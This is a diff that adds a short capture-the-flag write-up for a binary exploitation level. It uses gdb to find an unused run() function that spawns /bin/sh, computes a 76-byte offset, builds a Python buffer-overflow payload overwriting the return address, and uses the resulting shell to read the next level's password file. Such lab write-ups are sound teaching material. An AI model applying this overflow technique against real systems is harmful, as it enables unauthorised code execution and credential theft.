@@ -1,0 +1,37 @@
+Inspecting the binary on gdb, we notice a function run() which is not used in the binary.
+i func
+0x08048444  run
+0x08048480  main
+
+The run function calls system(/bin/sh).
+
+The goal is then to overwrite an address in the main function with the run function's address.
+
+In order to do this we need to know where to overflow :
+push -> +4
+and -> + 8
+0x50 -> +80
+lea -> -16
+
+We get 76, let's try.
+
+python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/payload
+gdb level2
+b main
+b * 0x08048490
+r < /tmp/payload
+c
+=> 0x08048490 <+16>:    call   0x8048340 <gets@plt>
+n
+0x08048444 in run ()
+
+Our payload worked and we ran the run() function instead of gets().
+
+Let's use cat to leave the new shell open :
+
+cat /tmp/payload - | ./level1
+Good... Wait what?
+whoami
+level2
+cat /home/user/level2/.pass
+
